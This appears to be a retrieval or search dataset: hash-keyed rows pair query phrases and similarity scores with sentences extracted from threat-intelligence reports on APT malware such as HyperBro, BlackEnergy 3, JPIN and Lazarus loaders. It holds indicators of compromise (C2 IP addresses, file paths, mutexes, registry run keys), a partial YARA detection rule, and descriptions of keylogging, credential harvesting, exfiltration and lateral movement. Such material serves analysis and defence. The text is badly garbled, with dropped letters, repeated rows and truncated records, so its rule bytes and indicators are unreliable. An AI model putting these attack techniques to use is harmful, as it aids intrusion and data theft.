b14d0c5f2908a31fefdfa23876d48589cd04dec9e738a96bc85b0bf58b458 version = 1.0 first_imported = 202-01-14 last_modified = 202-01-14 status = RELEASED sharing = TLP:WHITE source = BUNDESAMT FUER VERFASUNGSCHUTZ author = Bundesamt fuer Verfasungschutz description = Yara rule to detect first Hyperbro Loader Stage, often caled vftrace.dl.', 'Detects decoding function.', 'category = MALWARE malware = HYPERBRO mitre_at = S0398 reference = Warnmeldung des BFV - Aktuele APT27-Angrifskampagne gegen deutsche Wirtschaftsunternehmen hash = 3B52C2CFAC56B86E9D54AEF4F0F414528917BC1A1FE1613EFC231839A strings: $decoder_routine = { 8A ?', '41 10 0 0 8B ?', '28 ?', '?', '4?']"
ead0fda2e6cad3ae5192122cc05e6c49,decoding function,0.7751180248022331,"[': 028-9-792-260 oder cyberabwehr@bfv.bund.de Bundesamt fr Verfasungschutz - Cyber-Brief Nr.', '01/202 8 TLP:WHITE BfV Cyber-Brief Anhang A.', 'Indicators of Compromise (IOCs) Typ IOC Funktion IP 104.168.236.46 C2-Server IP 103.79.7.20 C2-Server IP 87.98.190.184 C2-Server Weitere mgliche Indikatoren fr eine Infektion Die folgenden Indikatoren knten auch einen legitimen Ursprung haben, solten aber denoch ein- gehend geprft werden: Log-Datei mit Tastaturanschlgen (vom Datei %TEMP%\\<username>.key.log Keyloger aufgezeichnet) Datei %TEMP%\\<username>.clip.log Log-Datei mit Inhalt der Zwischenablage Named Pipe fr IPC zwischen Daemon Named Pipe \\.\\pipe\\testpipe Prozes und Worker Prozes Mutex die vom Program erstelt wird Mutex 80A853-1E05-4323-B4F9-43A4396A4507 um Mehrfachausfhrung zu verhindern Wird angelegt wen Schadsoftware mit Admin-Rechten ausgefhrt wird Service windefenders Anzeigename Windows Defenders Beschreibung Windows Defenders Service Optional weitere Injection in msiexec Prozes msiexec.exe durch entsprechendes C2-Komando ausgelst Mozila/5.0 (Windows NT 6.3; WOW64) ApleWebKit/537.36 User Agent String den die Malware User Agent (KHTML, like Gecko) Chrome/34.0.1847.16 Safari/537.36 fr C2 (htps) verwendet Pfad auf dem C2-Server an den Remote Pfad /api/v2/ajax POST-Requests bertragen werden HKEY_CURENT_USER\\Software\\Microsoft\\Windows\\ Run Key als Persistenzmechanismus bei Aus- Registry CurentVersion\\Run\\windefenders fhrung ohne Admin-Rechte %ProgramFiles%\\Comon Files\\windefenders\\ %ProgramFiles%\\Comon Files\\windefenders\\config.ini %ProgramFiles%\\Comon Files\\windefenders\\msmpeng.exe %ProgramFiles%\\Comon Files\\windefenders\\thumb.dat %ProgramFiles%\\Comon Files\\windefenders\\vftrace.dl Dateien / Ablageorte und Komponenten der Malware Pfade %ProgramData%\\windefenders\\ %ProgramData%\\windefenders\\config.ini %ProgramData%\\windefenders\\msmpeng.exe %ProgramData%\\windefenders\\thumb.dat %ProgramData%\\windefenders\\vftrace.dl Bundesamt fr Verfasungschutz - Cyber-Brief Nr.', '01/202 9 TLP:WHITE BfV Cyber-Brief Anhang B. Detektionsregeln -HYPERBRO (Yara) Detektionsregel I: Stage-Loader Anmerkung: Die nachfolgende Yara-Regel dient zur Identifikation des initialen Stage-Loaders aus der Datei vftra- ce.dl der HYPERBRO Malware und detektiert die entsprechende Dekodier-Funktion.', 'import pe rule vftrace_loader { meta: id = 4eEDO8F3p27FeY5YLIPjrA fingerprint = b14d0c5f2908a31fefdfa23876d48589cd04dec9e738a96bc85b0bf58b458 version = 1.0 first_imported = 202-01-14 last_modified = 202-01-14 status = RELEASED sharing = TLP:WHITE source = BUNDESAMT FUER VERFASUNGSCHUTZ author = Bundesamt fuer Verfasungschutz description = Yara rule to detect first Hyperbro Loader Stage, often caled vftrace.dl.', 'Detects decoding function.', 'category = MALWARE malware = HYPERBRO mitre_at = S0398 reference = Warnmeldung des BFV - Aktuele APT27-Angrifskampagne gegen deutsche Wirtschaftsunternehmen hash = 3B52C2CFAC56B86E9D54AEF4F0F414528917BC1A1FE1613EFC231839A strings: $decoder_routine = { 8A ?', '41 10 0 0 8B ?', '28 ?', '?', '4?']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,Log keystrokes,0.9372036161740571,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,Log keystrokes,0.9372036161740571,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
43c4d451e00c987d975ae5ee42e9c930,domain fronting,0.8688512556794599,"['SilverFish Group Threat Actor Report TLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']"
3af34358f61650bfa5d23d79f9018baf,domain fronting,0.8688512556794599,"['SilverFish Group Threat Actor Report TLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']"
7607a101fda17219c8a6cbc34de42baa,brute forcing,0.7509168829320207,"['16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .', '19 Pre-predecesor: c.bat .', '20 Initial infection vector .', '21 SQL server brute forcing .', '21 SQL comand colection .', '2 SQL brute forcer .', '23 EternalBlue spreader .', '28 Payloads .', '32 PCShare .']"
7607a101fda17219c8a6cbc34de42baa,brute forcing,0.7509168829320207,"['16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .', '19 Pre-predecesor: c.bat .', '20 Initial infection vector .', '21 SQL server brute forcing .', '21 SQL comand colection .', '2 SQL brute forcer .', '23 EternalBlue spreader .', '28 Payloads .', '32 PCShare .']"
aa3c3157a2336623d96a7e2fa57fec02,brute forcing,0.8281803052702272,"['6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .', '8 3.2 Remote code execution vulnerability.', '8 3.3 Encryption key brute forcing .', '8 3.4 Exploitation .', '9 3.5 Shelcode .', '1 4 Information obtained on the C&C .', '12 4.1 Infrastructure schema.', '12 4.2 Tols .']"
aa3c3157a2336623d96a7e2fa57fec02,brute forcing,0.8281803052702272,"['6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .', '8 3.2 Remote code execution vulnerability.', '8 3.3 Encryption key brute forcing .', '8 3.4 Exploitation .', '9 3.5 Shelcode .', '1 4 Information obtained on the C&C .', '12 4.1 Infrastructure schema.', '12 4.2 Tols .']"
5101982187a390412f3a08299a0be623,the file to be downloaded.,0.8526330435912421,"['Suported comands are: Execute an arbitrary comand on the victims machine.', 'Its worth /run noting that comand results are expected to be encoded in Cyrilic codepage.', 'Sends the contents of the file stored on the victims machine at the /download <path> given path.', 'Writes the received file on the victims machine at the path specified [file atachment] in the atachments caption, or in the curent directory by default.', 'Telemiris replies with !', '(File downloaded!).', 'From what we observed, Telemiris is used as a first-stage implant that operators use to deploy other tols such as Ropy, JLORAT, or even the legitimate WinSCP binary, to further exfiltrate files.', 'Ropy Writen in Pascal, this file stealer crawls the victims filesystem at regular intervals and uploads al files of interest to its C2 server.', 'At startup, it wastes CPU cycles on dead code and useles lops, which we asume are for evasion purposes.', 'Ropy then creates its working directory (%ApData%/Microsoft/OneDrive) where it stores the list of already uploaded files (as upload.dat) and a copy of documents waiting to be uploaded (in the backup subfolder).', 'Then, every 40-80 minutes, Ropy crawls C:\\Users and al other drives (D:, E:, ), loks for al documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them for upload.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt,1.0,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
9a2760335ecc6c4be55b182e9ce4dd33,deleting files,0.8030818433868365,"['Capability #10: Delete file Both implants can delete a file specified by the control server if it is not a directory.', 'Figure 23.', 'Similarities in Duzers (at left) and Rising Suns code for gathering file times.', 'Capability #7: Read a file Both implants can read the contents of a file specified by Figure 24.', 'Similarities in Duzers (at left) and Rising Suns code for the control server and exfiltrate the contents of the file.', 'deleting a file.', 'Capability #8: Clear proces memory There are no significant similarities betwen the two implants.', '2 Operation Sharpshoter REPORT Capability #1: Get aditional file information for files Capability #12: Conect to an IP adres in a directory Both implants test conections to a specified IP adres Both implants have the same capability to get file using the same actions, APIs, and code signatures: information for files in a specified directory, including the Test a conection to a specified network IP adres folowing data: over a specified port number.', 'File atributes Only atempt to conect to the network adres.', 'File size Based on the conection atempt, send either a File creation time suces or a failure response to the control server.', 'Last aces time Capability #13: Change file atributes File write time Both implants can modify the same file atributes: MZ compile time File atributes (hiden, system, etc.)']"
9a2760335ecc6c4be55b182e9ce4dd33,deleting files,0.8030818433868365,"['Capability #10: Delete file Both implants can delete a file specified by the control server if it is not a directory.', 'Figure 23.', 'Similarities in Duzers (at left) and Rising Suns code for gathering file times.', 'Capability #7: Read a file Both implants can read the contents of a file specified by Figure 24.', 'Similarities in Duzers (at left) and Rising Suns code for the control server and exfiltrate the contents of the file.', 'deleting a file.', 'Capability #8: Clear proces memory There are no significant similarities betwen the two implants.', '2 Operation Sharpshoter REPORT Capability #1: Get aditional file information for files Capability #12: Conect to an IP adres in a directory Both implants test conections to a specified IP adres Both implants have the same capability to get file using the same actions, APIs, and code signatures: information for files in a specified directory, including the Test a conection to a specified network IP adres folowing data: over a specified port number.', 'File atributes Only atempt to conect to the network adres.', 'File size Based on the conection atempt, send either a File creation time suces or a failure response to the control server.', 'Last aces time Capability #13: Change file atributes File write time Both implants can modify the same file atributes: MZ compile time File atributes (hiden, system, etc.)']"
da720a0b860cc8b213511d0e3c6beb1b,enumerate files and registry keys,0.9239749634072519,"['PLATINUM uses at least thre distinct JPIN variants.', 'One variant typicaly runs with a mutex named hMSVm and instals itself in the folders %apdata%\\Com\\Jpin and %userprofile%\\ApData\\Resource\\Jpin.', 'After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.']"
da720a0b860cc8b213511d0e3c6beb1b,enumerate files and registry keys,0.9239749634072519,"['PLATINUM uses at least thre distinct JPIN variants.', 'One variant typicaly runs with a mutex named hMSVm and instals itself in the folders %apdata%\\Com\\Jpin and %userprofile%\\ApData\\Resource\\Jpin.', 'After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.']"
d8791e89f9eb44fcb336c885ff361602,OS Version,0.7653642387849391,"['before it actualy handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wraped in 2 layers using simple crypters, so the first crypter decodes the second, and the later decodes the actual loader code.', 'htps:/research.checkpoint.com/upsynergy/ 10/24 9/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the folowing steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreConectList in sys.', '4.', 'Extract the encoded shelcode from a Transaction object list.']"
d8791e89f9eb44fcb336c885ff361602,OS Version,0.7653642387849391,"['before it actualy handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wraped in 2 layers using simple crypters, so the first crypter decodes the second, and the later decodes the actual loader code.', 'htps:/research.checkpoint.com/upsynergy/ 10/24 9/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the folowing steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreConectList in sys.', '4.', 'Extract the encoded shelcode from a Transaction object list.']"
89fef8e793306b3786a3bba91d1bd697,OS Version,0.7903239251197405,"['2 0 1 9.', '- 2 0 1 9.', '-18 2 0 1 9. , 2 , -, .', '1 , -.', 'enti- tyTypeId .', '.', '- -, .', 'JSON- -, JSON.', '2 , , .', ', .', 'JSON- data GetResult.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,the ability to log keystrokes,0.7661441745421825,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,the ability to log keystrokes,0.7661441745421825,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system information,0.8783849880571661,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system information,0.8783849880571661,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
aa5554e4d0bd1f83658136b2c87b9fcd,Microsoft Exchange Server Privilege Escalation Vulnerability,0.7842363731822818,"['GitHub, Inc. Windows IKEXT DL Hijacking Exploit Tol.', 'Last acesed on 2 January 2020 at htps:/github.com/itm4n/Ikext-Privesc.', '6 ImuniWeb.', '(8 October 2012).', 'ImuniWeb.', 'Privilege Escalation Vulnerability in Microsoft Windows.', 'Last acesed on 23 January 2020 at htps:/w.imuniweb.com/advisory/HTB23108.', '7 Lawrence Abrams.', '(15 November 2016).', 'Bleping Computer.', 'CryptoLuck Ransomware being Malvertised via RIG-E Exploit Kits.']"
aa5554e4d0bd1f83658136b2c87b9fcd,Microsoft Exchange Server Privilege Escalation Vulnerability,0.7842363731822818,"['GitHub, Inc. Windows IKEXT DL Hijacking Exploit Tol.', 'Last acesed on 2 January 2020 at htps:/github.com/itm4n/Ikext-Privesc.', '6 ImuniWeb.', '(8 October 2012).', 'ImuniWeb.', 'Privilege Escalation Vulnerability in Microsoft Windows.', 'Last acesed on 23 January 2020 at htps:/w.imuniweb.com/advisory/HTB23108.', '7 Lawrence Abrams.', '(15 November 2016).', 'Bleping Computer.', 'CryptoLuck Ransomware being Malvertised via RIG-E Exploit Kits.']"
ac63a7f7f1feec884b166d7bdda0afad,This could cause the file to run when double-clicked instead of opening it with a PDF viewer.,1.0,"['Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct mesages on LinkedIn.', 'The archive contains a single file: a native 64-bit Intel Linux binary writen in Go and named HSBC job oferpdf.', 'Interestingly, the file extension is not .pdf.', 'This is because the aparent dot character in the filename is a leader dot represented by the U+2024 Unicode character.', 'The use of the leader dot in the filename was probably an atempt to trick the file manager into treating the file as an executable instead of a PDF.', 'This could cause the file to run when double-clicked instead of opening it with a PDF viewer.', 'On execution, a decoy PDF is displayed to the user using xdg-open, which wil open the document using the users prefered PDF viewer (se Figure 3).', 'We decided to cal this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive.', 'OdicLoader drops a decoy PDF document, displays it using the systems default PDF viewer (se Figure 2), and then downloads a second-stage backdor from the OpenDrive cloud service.', 'The downloaded file is stored in ~/.config/guiconfigd (SHA-1: 0CA1723AFE261CD85B05C9EF424FC50290DCE7DF).', 'We cal this second-stage backdor SimplexTea.']"
